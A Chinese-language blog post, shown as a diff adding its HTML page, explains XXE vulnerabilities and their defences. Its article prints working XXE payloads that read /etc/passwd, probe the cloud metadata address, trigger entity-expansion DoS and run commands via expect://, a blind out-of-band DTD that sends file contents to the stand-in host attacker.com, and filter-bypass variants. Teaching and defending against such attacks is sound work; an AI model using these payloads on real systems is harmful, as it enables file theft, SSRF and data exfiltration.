@@ -1,0 +1,322 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XXE | ms的小站</title><meta name="author" content="ms"><meta name="copyright" content="ms"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="XXE漏洞原理： 利用XML解析器的外部实体加载功能实现攻击的漏洞。攻击者通过构造恶意XML数据，使服务器解析时加载外部资源（如本地文件、远程URL），导致敏感信息泄露、SSRF攻击甚至远程代码执行。 核心机制：  XML实体定义：XML允许通过&lt;!ENTITY&gt;定义实体，实体可应用内部值或外部资源 1234&lt;!-- 内部实体 --&gt;&lt;!ENTITY name &amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE">
+<meta property="og:url" content="https://ms-vv.github.io/posts/cm9uvjlr4000bcwvp9rqjex9y">
+<meta property="og:site_name" content="ms的小站">
+<meta property="og:description" content="XXE漏洞原理： 利用XML解析器的外部实体加载功能实现攻击的漏洞。攻击者通过构造恶意XML数据，使服务器解析时加载外部资源（如本地文件、远程URL），导致敏感信息泄露、SSRF攻击甚至远程代码执行。 核心机制：  XML实体定义：XML允许通过&lt;!ENTITY&gt;定义实体，实体可应用内部值或外部资源 1234&lt;!-- 内部实体 --&gt;&lt;!ENTITY name &amp;qu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aba1ab0d.cloudflare-imgbed-94t.pages.dev/file/1745108449459_%E8%8A%99%E5%AE%81%E5%A8%9C%20%E4%B8%80%E8%B5%B7%E5%8E%BB%E6%B5%B7%E8%BE%B9%204K%E5%A3%81%E7%BA%B8%203840x2160_%E5%BD%BC%E5%B2%B8%E5%9B%BE%E7%BD%91.jpg">
+<meta property="article:published_time" content="2025-03-20T02:16:10.000Z">
+<meta property="article:modified_time" content="2025-04-23T12:59:30.305Z">
+<meta property="article:author" content="ms">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aba1ab0d.cloudflare-imgbed-94t.pages.dev/file/1745108449459_%E8%8A%99%E5%AE%81%E5%A8%9C%20%E4%B8%80%E8%B5%B7%E5%8E%BB%E6%B5%B7%E8%BE%B9%204K%E5%A3%81%E7%BA%B8%203840x2160_%E5%BD%BC%E5%B2%B8%E5%9B%BE%E7%BD%91.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XXE",
+  "url": "https://ms-vv.github.io/posts/cm9uvjlr4000bcwvp9rqjex9y",
+  "image": "https://aba1ab0d.cloudflare-imgbed-94t.pages.dev/file/1745108449459_芙宁娜 一起去海边 4K壁纸 3840x2160_彼岸图网.jpg",
+  "datePublished": "2025-03-20T02:16:10.000Z",
+  "dateModified": "2025-04-23T12:59:30.305Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ms",
+      "url": "https://ms-vv.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/blog/M.ico"><link rel="canonical" href="https://ms-vv.github.io/posts/cm9uvjlr4000bcwvp9rqjex9y"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XXE',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (true) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/blog/ms.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://aba1ab0d.cloudflare-imgbed-94t.pages.dev/file/1745108449459_芙宁娜 一起去海边 4K壁纸 3840x2160_彼岸图网.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ms的小站</span></a><a class="nav-page-title" href="/"><span class="site-name">XXE</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XXE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-20T02:16:10.000Z" title="发表于 2025-03-20 10:16:10">2025-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-23T12:59:30.305Z" title="更新于 2025-04-23 20:59:30">2025-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><strong>漏洞原理：</strong></p>
+<p>利用XML解析器的<strong>外部实体加载功能</strong>实现攻击的漏洞。攻击者通过构造恶意XML数据，使服务器解析时加载外部资源（如本地文件、远程URL），导致敏感信息泄露、SSRF攻击甚至远程代码执行。</p>
+<p><strong>核心机制：</strong></p>
+<ul>
+<li><p>XML实体定义：XML允许通过<code>&lt;!ENTITY&gt;</code>定义实体，实体可应用内部值或外部资源</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;value&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解析器特性：未安全配置的XML解析器（如DOM、SAX）默认加载外部实体，攻击者通过注入恶意实体触发非预期行为</p>
+</li>
+</ul>
+<p><strong>触发条件：</strong></p>
+<ul>
+<li>应用程序接受并解析用户可控的XML数据（如API请求、文件上传）</li>
+<li>XML解析器启用外部实体解析且未过滤危险协议（如<code>file://</code>、<code>http://</code>）</li>
+</ul>
+<h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><p><strong>攻击方式：</strong></p>
+<ul>
+<li><p>读取本地文件：通过<code>file://</code>协议读取服务器文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发起SSRF攻击：利用<code>http://</code>协议探测内网服务或元数据接口</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://169.254.169.254/latest/meta-data/&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>拒绝服务（Dos）：通过递归实体应用触发解析器崩溃</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">lol1</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>远程代码执行（需特定环境）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>盲注XXE（Blind XXE）</strong></p>
+<p>当响应不直接返回数据时，通过外带通道（OOB）泄露信息</p>
+<ul>
+<li><p>利用DNS查询：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/?data=%file;&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造外部DTD文件：攻击者托管恶意DTD文件，触发服务器解析并回传数据</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 恶意DTD（evil.dtd） --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">exfil</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
+
+<p>目标XML载荷：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><p><strong>禁用外部实体：</strong></p>
+<ul>
+<li><p>java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>使用安全解析器：</strong></p>
+<ul>
+<li>优先选择禁用DTD和外部实体的库（如OWASP推荐的<code>XMLSec</code>）。</li>
+</ul>
+<p><strong>输入过滤与白名单：</strong></p>
+<ul>
+<li>过滤用户输入的<code>&lt;!DOCTYPE&gt;</code>、<code>&lt;!ENTITY&gt;</code> 等关键字。</li>
+<li>校验XML结构是否符合预期模式（如XSD）</li>
+</ul>
+<p><strong>限制协议与访问范围：</strong></p>
+<ul>
+<li>禁用危险协议（<code>file://</code>、<code>http://</code>），仅允许必要协议（如<code>https://</code>）。</li>
+<li>配置防火墙规则，阻止服务器向内部网络或元数据接口发起请求</li>
+</ul>
+<p><strong>使用JSON代替XML：</strong></p>
+<ul>
+<li>若非必须，避免使用XML格式，改用JSON等更安全的数据格式。</li>
+</ul>
+<h1 id="XXE绕过"><a href="#XXE绕过" class="headerlink" title="XXE绕过"></a>XXE绕过</h1><p><strong>协议处理差异：</strong></p>
+<ul>
+<li>利用支持的协议：不同解析器支持的协议可能不同（如PHP的<code>php://filter</code>、java的<code>jar://</code>）<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>编码与混淆：</strong></p>
+<ul>
+<li><p>十六进制&#x2F;UTF-8编码：绕过关键字过滤</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;ht&quot;</span> <span class="string">&quot;tp://attacker.com&quot;</span>&gt;</span>  <span class="comment">&lt;!-- 拆分字符串 --&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>CDATA块包裹：隐藏恶意内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]]&gt;  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>利用未禁用参数实体：</strong></p>
+<ul>
+<li>若仅禁用外部通用实体，但允许参数实体：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="keyword">param_entity</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %param_entity;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>XInclude攻击：</strong></p>
+<ul>
+<li>当XML解析器支持XInclude且禁用DTD时：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>文件上传结合XXE：</strong></p>
+<ul>
+<li>上传SVG、DOCX等包含XML的文档，触发解析漏洞。</li>
+</ul>
+</article><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://aba1ab0d.cloudflare-imgbed-94t.pages.dev/file/1745108449459_芙宁娜 一起去海边 4K壁纸 3840x2160_彼岸图网.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/cm9uvjlr40009cwvp3r3v4ylb" title="SSTI"><img class="cover" src="https://aba1ab0d.cloudflare-imgbed-94t.pages.dev/file/1745108514105_222.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SSTI</div></div><div class="info-2"><div class="info-item-1">SSTI漏洞原理： 通过向模板引擎注入恶意代码，在服务器端执行任意操作的漏洞。其核心是应用程序将用户输入直接拼接到模板中，导致攻击者能操控模板解析逻辑，绕过业务限制实现代码执行、文件读取或权限提升。 核心机制:  模板引擎功能：模板引擎（如Jinja2、Thymeleaf、Freemarker）用于动态生成HTML，支持变量插值、逻辑控制（如循环、条件判断）  用户输入拼接至模板：未过滤的用户输入被直接插入模板表达式，触发模板引擎的代码执行能力。 1234# 漏洞代码示例（Python Flask + Jinja2）@app.route(&#x27;/greet/&lt;name&gt;&#x27;)def greet(name):    return render_template_string(f&quot;Hello, &#123;name&#125;!&quot;)  # 直接拼接用户输入  沙箱逃逸：许多模板引擎默认运行在沙箱中，但攻击者通过特定语法或对象链（Gadget...</div></div></div></a><a class="pagination-related" href="/posts/cm9uvjlr7000kcwvp56ed7ril" title="弱口令"><img class="cover" src="https://aba1ab0d.cloudflare-imgbed-94t.pages.dev/file/1745108449395_333.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">弱口令</div></div><div class="info-2"><div class="info-item-1">弱口令基本原理： 用户或系统管理员设置的安全性极低的密码，其特点是易猜测、易破解。弱口令漏洞的本质是身份认证机制缺乏强密码策略，使得攻击者可通过简单手段（如暴力破解、字典攻击）获取合法权限，进而控制账户或系统。 核心机制：  密码复杂度不足：密码长度过短（如6位以下）、未包含多种字符类型（数字、大小写字母、符号）、使用常见词汇（如password、admin）或个人信息（如生日、姓名） 默认密码未修改：设备、系统或应用出厂时预设的默认账户密码（如admin&#x2F;admin、root&#x2F;123456）未被用户修改 密码重复使用：同意密码在多个系统或服务中重复使用，导致一处泄露，多出沦陷（撞库攻击）  常见场景：  用户账户：个人邮箱、社交平台、网购账户 管理员账户：服务器SSH、数据库、路由器后台 物联网设备：摄像头、智能家居设备的默认密码  弱口令利用攻击方式：  暴力破解：穷举所有可能的密码组合，适用于短密码（如4位纯数字） 12# 使用Hydra暴力破解SSHhydra -l root -P passwords.txt...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><!--!=partial('includes/widget/card_author', {}, {cache: true})--><!--!=partial('includes/widget/card_announcement', {}, {cache: true})--><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">1.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">XXE利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E9%98%B2%E5%BE%A1"><span class="toc-number">3.</span> <span class="toc-text">XXE防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">XXE绕过</span></a></li></ol></div></div><!--!=partial('includes/widget/card_recent_post', {}, {cache: true})--></div></div></main><footer id="footer" style="background-image: url(https://aba1ab0d.cloudflare-imgbed-94t.pages.dev/file/1745108449459_芙宁娜 一起去海边 4K壁纸 3840x2160_彼岸图网.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By ms</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
